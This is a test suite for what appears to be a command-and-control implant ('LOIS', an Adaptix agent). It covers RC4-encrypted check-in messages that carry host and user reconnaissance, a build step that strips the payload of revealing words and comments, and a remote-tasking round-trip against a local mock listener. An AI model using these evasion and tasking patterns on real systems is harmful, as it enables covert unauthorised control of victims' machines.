// run_tests.js — LOIS test suite (node test/run_tests.js). Zero deps.
// Covers: rc4 vector, packer round-trip, beat layout (incl. the IP byte-swap),
// template extraction, jitter envelope, artifact hygiene, and a full
// registration + task round-trip against test/mock_listener.js using the
// BUILT bundle (dist/bundle.js, built with --fixed-tokens for stable envs).
const { spawn, spawnSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const assert = require('assert');

const ROOT = path.join(__dirname, '..');
const NODE = process.execPath;
const { rc4 } = require('../src/rc4');
const { Packer, Unpacker } = require('../src/packer');
const { buildBeat } = require('../src/beat');
const { extractData } = require('../src/agent');
const { TaskReader, OutPacker, iterateTasks } = require('../src/tasks');

let passed = 0;
function ok(name) { passed++; console.log('  ok - ' + name); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

(async function main() {
  // 1. rc4 known-answer (RFC 6229 style vector: Key/Plaintext)
  {
    const out = rc4(Buffer.from('Plaintext'), Buffer.from('Key'));
    assert.strictEqual(out.toString('hex'), 'bbf316e8d940af0ad3');
    ok('rc4 KAT');
  }

  // 2. packer round-trip (BE)
  {
    const p = new Packer();
    p.u32(0xdeadbeef).u16(0x1234).u8(0x42).bytes(Buffer.from('ab')).str('hello');
    const u = new Unpacker(p.data());
    assert.strictEqual(u.u32(), 0xdeadbeef);
    assert.strictEqual(u.u16(), 0x1234);
    assert.strictEqual(u.u8(), 0x42);
    assert.strictEqual(u.bytes().toString(), 'ab');
    assert.strictEqual(u.str(), 'hello');
    ok('packer round-trip');
  }

  // 3. beat layout — parse with the canonical field order + ip swap
  {
    const cfg = { agent_type: 0xbe4c0149, agent_id: 0xcafe0011, sleep_delay: 30,
                  jitter_delay: 20, encrypt_key: '00112233445566778899aabbccddeeff' };
    const info = { acp: 1252, oemcp: 437, gmt_offset: 2, pid: 1337, tid: 0,
                   build_number: 22631, major_version: 10, minor_version: 0,
                   internal_ip: 0xc0a80121, is_server: false, elevated: true,
                   sys64: true, arch64: true, domain_name: 'CORP',
                   computer_name: 'WS-1', username: 'op', process_name: 'Code.exe' };
    const b = buildBeat(cfg, info, Buffer.alloc(16, 7));
    const dec = rc4(Buffer.from(b.headerValue, 'base64'), Buffer.from(cfg.encrypt_key, 'hex'));
    const u = new Unpacker(dec);
    assert.strictEqual(u.u32(), 0xbe4c0149);
    assert.strictEqual(u.u32(), 0xcafe0011);
    assert.strictEqual(u.u32(), 30);
    assert.strictEqual(u.u32(), 20);
    u.u32(); u.u32();
    assert.strictEqual(u.u16(), 1252);
    assert.strictEqual(u.u16(), 437);
    assert.strictEqual(u.u8(), 2);
    assert.strictEqual(u.u16(), 1337);
    u.u16();
    assert.strictEqual(u.u32(), 22631);
    assert.strictEqual(u.u8(), 10);
    assert.strictEqual(u.u8(), 0);
    assert.strictEqual(u.u32(), 0x2101a8c0); // 192.168.1.33 swapped (wire order)
    assert.strictEqual(u.u8(), 0b0111);      // elevated+sys64+arch64
    assert.strictEqual(u.bytes().toString('hex'), '07070707070707070707070707070707');
    assert.strictEqual(u.str(), 'CORP');
    assert.strictEqual(u.str(), 'WS-1');
    assert.strictEqual(u.str(), 'op');
    assert.strictEqual(u.str(), 'Code.exe');
    ok('beat layout + ip swap');
  }

  // 4. template extraction
  {
    const cfg = { resp_pre: '{"status": "ok", "data": "', resp_post: '","metrics": "sync"}' };
    const inner = Buffer.from([0, 1, 2, 255, 34, 39]); // latin1 binary safety
    const body = Buffer.from(cfg.resp_pre + inner.toString('latin1') + cfg.resp_post, 'latin1');
    const got = extractData(body, cfg);
    assert.deepStrictEqual([...got], [...inner]);
    ok('template extract (binary-safe)');
  }

  // 5. task stream iteration: LE in / BE out
  {
    const le = [];
    const u32le = (v) => { const b = Buffer.allocUnsafe(4); b.writeUInt32LE(v); le.push(b); };
    u32le(4); u32le(0x9999); // cmd pwd + taskId
    const payload = Buffer.concat(le);
    const size = Buffer.allocUnsafe(4); size.writeUInt32LE(payload.length, 0);
    const stream = Buffer.concat([size, payload]);
    const tasks = [...iterateTasks(stream)];
    assert.strictEqual(tasks.length, 1);
    assert.strictEqual(tasks[0].commandId, 4);
    assert.strictEqual(tasks[0].reader.u32(), 0x9999);

    const out = new OutPacker();
    out.u32(0x9999).u32(4).str('/tmp');
    const built = out.build();
    assert.strictEqual(built.readUInt32BE(0), built.length); // self-counting
    ok('task framing LE/BE');
  }

  // 6. build + hygiene
  {
    const r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
                               '--fixed-tokens', '--no-min', '--name', 'testbundle'],
                        { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
    const art = fs.readFileSync(path.join(ROOT, 'dist', 'testbundle.js'), 'utf8')
                  .replace('<<<PAYLOAD_DATA>>>', '');
    for (const w of ['lois', 'beacon', 'adaptix', 'implant', 'inject', 'airlock'])
      assert.ok(!art.toLowerCase().includes(w), `denylist word '${w}' in artifact`);
    assert.ok(!/^\s*log\(/m.test(art), 'log() line survived in artifact');
    assert.ok(!/^\s*\/\//m.test(art), 'comment line survived');
    assert.ok(!/(^|[ \t])\/\*/.test(art), 'block comment survived'); // "'*/*'" header string is not a comment
    ok('build + hygiene denylist');
  }

  // 7. full round-trip: mock listener + built bundle agent
  {
    const port = 21000 + (process.pid % 20000);
    const tasksFile = path.join(__dirname, '.tasks.ndjson');
    fs.writeFileSync(tasksFile, '');
    const mock = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tasksFile],
      { env: { ...process.env, LISTEN_PORT: String(port) }, stdio: ['ignore', 'pipe', 'pipe'] });
    let mout = '';
    mock.stdout.on('data', (d) => { mout += d; });
    mock.stderr.on('data', (d) => { mout += d; });
    await sleep(600);
    assert.ok(mout.includes('[mock] listening'), 'mock listener up: ' + mout);

    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
      env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
             LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_DEBUG: '1',
             MAX_CYCLES: '20' },
      stdio: ['ignore', 'pipe', 'pipe'] });
    let aout = '';
    agent.stdout.on('data', (d) => { aout += d; });
    agent.stderr.on('data', (d) => { aout += d; });

    // wait for registration, then queue tasks (one per tick: sleep=1s)
    const deadline = Date.now() + 12000;
    while (Date.now() < deadline && !mout.includes('[reg] NEW agent')) await sleep(200);
    assert.ok(mout.includes('[reg] NEW agent'), 'registration: ' + mout + '\nagent: ' + aout);
    ok('registration over the wire');

    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 4 }) + '\n');   // pwd
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 14, path: '.' }) + '\n'); // ls
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 27, path: 'lwtest-dir' }) + '\n'); // mkdir
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 21, sub: 1, sleep: 3, jitter: 5 }) + '\n'); // sleep change
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 10, method: 0 }) + '\n'); // terminate

    const dl2 = Date.now() + 8000;
    while (Date.now() < dl2 && agent.exitCode === null) await sleep(200);

    assert.ok(mout.includes('cmd=4') && mout.includes('cwd='), 'pwd reply: ' + mout);
    assert.ok(mout.includes('cmd=14') && mout.includes('ls ok=1'), 'ls reply: ' + mout);
    assert.ok(mout.includes('cmd=27') || fs.existsSync(path.join(process.cwd(), 'lwtest-dir')),
              'mkdir reply/effect');
    assert.ok(mout.includes('cmd=21'), 'profile reply');
    assert.ok(agent.exitCode !== null || mout.includes('cmd=10'), 'terminate honored');
    try { agent.kill('SIGKILL'); } catch (_) {}
    mock.kill('SIGKILL');
    fs.rmSync(tasksFile, { force: true });
    fs.rmSync(path.join(process.cwd(), 'lwtest-dir'), { recursive: true, force: true });
    ok('task round-trip (pwd/ls/mkdir/sleep/terminate)');
  }

  console.log(`\n${passed} passed`);
})().catch((e) => { console.error('FAIL:', e); process.exit(1); });
